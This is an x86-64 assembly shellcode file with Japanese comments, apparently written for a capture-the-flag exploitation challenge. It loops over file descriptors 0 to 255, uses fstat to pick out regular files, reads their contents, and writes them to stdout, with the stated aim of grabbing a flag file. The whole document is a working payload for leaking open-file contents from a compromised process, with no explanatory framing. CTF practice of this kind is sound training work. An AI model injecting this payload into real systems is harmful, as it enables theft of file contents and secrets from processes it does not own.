.intel_syntax noprefix
.globl _start
_start:
    sub rsp, 0x100
    mov rbx, 0 # fd

loc_loop:
    # fstatでファイルっぽいものだけを表示する
    mov rax, 5 # pwn.constants.linux.amd64.SYS_fstat
    mov rdi, rbx
    mov rsi, rsp
    syscall
    cmp rax, 0
    jnz loc_next

    # regular fileだけを見れたら良さそう
    mov rax, [rsp+0x18] # st_mode
    and rax, 0xF000
    cmp rax, 0x8000 # S_IFREG
    jnz loc_next

    # フラグっぽいファイルから読む
    mov rax, 0 # pwn.constants.linux.amd64.SYS_read
    mov rdi, rbx
    mov rsi, rsp
    mov rdx, 0x100
    syscall
    cmp rax, 0
    jl loc_next

    # 標準出力へ書き込む
    mov rdx, rax # length
    mov rax, 1 # pwn.constants.linux.amd64.SYS_write
    mov rdi, 1 # stdout
    mov rsi, rsp
    syscall

loc_next:
    inc rbx
    cmp rbx, 0x100
    jl loc_loop

    mov rax, 0x3c # SYS_exit
    mov rdi, 42
    syscall
